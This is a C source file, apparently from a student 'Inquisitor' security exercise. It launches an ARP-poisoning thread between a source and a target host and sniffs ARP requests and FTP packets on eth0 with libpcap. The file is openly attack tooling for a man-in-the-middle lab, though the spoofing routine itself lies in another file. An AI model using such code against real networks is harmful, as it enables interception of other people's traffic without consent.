#include "utils.h"
#include "spoofer.h"

static void packet_handler(u_char* user, const struct pcap_pkthdr* h, const u_char* bytes)
{
	state* s = (state*)user;

	int recon = false;

	// ARP (EtherType 0x0806)
	if (bytes[12] == 0x08 && bytes[13] == 0x06) { // ARP frame detected
		if (bytes[20] == 0x00 && bytes[21] == 0x01) {
			printf("ARP request detected.\n");
			recon = true;
		}
	}

	else if (bytes[12] == 0x08 && bytes[13] == 0x00) { // IPv4 frame detected
		uint8_t ihl = bytes[14] & 0x0F; // Internet Header Length
		uint8_t protocol = bytes[23];   // Protocol field

		if (protocol == 6) { // TCP
			int ip_header_len = ihl * 4;
			int tcp_offset = 14 + ip_header_len;
			uint16_t src_port = (bytes[tcp_offset] << 8) | bytes[tcp_offset + 1];
			uint16_t dst_port = (bytes[tcp_offset + 2] << 8) | bytes[tcp_offset + 3];
			if (src_port == 21 || dst_port == 21 || src_port == 20 || dst_port == 20) {
				printf("FTP packet detected! Src port: %u, Dst port: %u\n", src_port, dst_port);
				recon = true;
			}
		}
	}

	if (recon) {
		printf("Destination MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			bytes[0], bytes[1], bytes[2],
			bytes[3], bytes[4], bytes[5]);
		printf("Source MAC: %02x:%02x:%02x:%02x:%02x:%02x\n",
			bytes[6], bytes[7], bytes[8],
			bytes[9], bytes[10], bytes[11]);
		printf("------------[%d]\n\n", s->count++);
	}
}

void listen_device(char const* name, char** addresses, char* inquisitor_mac)
{
	pcap_t* pcap;
	if (set_pcap(&pcap, name) != 0)
		return;

	state* user;
	if (set_user(&user, addresses, inquisitor_mac) != 0) {
		pcap_close(pcap);
		return ;
	}

	pthread_t	poisoner;
	spoofer_t	spoofer = {user, pcap};
	pthread_create(&poisoner, NULL, spoof, &spoofer);
	pthread_detach(poisoner);

	pcap_loop(pcap, 0, packet_handler, (u_char*) user);
	pcap_close(pcap);
}

int main(int argc, char **argv, char **envp)
{
	setvbuf(stdout, NULL, _IONBF, 0);

	
	if (argc != 5) {
		fprintf(stderr, "Usage: %s <source_ip> <source_mac> <target_ip> <target_mac>\n", argv[0]);
		return 1;
	}
	
	char* inquisitor_mac = find_inquisitor_mac(envp);
	if (inquisitor_mac == NULL) {
		fprintf(stderr, "INQUISITOR_MAC environment variable not set.\n");
		return 1;
	}

	printf("source IP: %s\n", argv[1]);
	printf("source MAC: %s\n", argv[2]);
	printf("target IP: %s\n", argv[3]);
	printf("target MAC: %s\n", argv[4]);
	printf("Inquisitor MAC: %s\n", inquisitor_mac);

	pcap_if_t *alldevsp;
	char error_buffer[PCAP_ERRBUF_SIZE];

	if (pcap_findalldevs(&alldevsp, error_buffer) == -1) {
		printf("Error finding devices: %s\n", error_buffer);
		return 1;
	}

    for (pcap_if_t* d = alldevsp; true; d = d->next) {
		if (d == NULL) {
			printf("Device eth0 not found.\n");
			break;
		}

		if (strcmp(d->name, "eth0") == 0) {
			listen_device(d->name, &argv[1], inquisitor_mac);
			break;
		}
	}

	pcap_freealldevs(alldevsp);
	return 0;
}
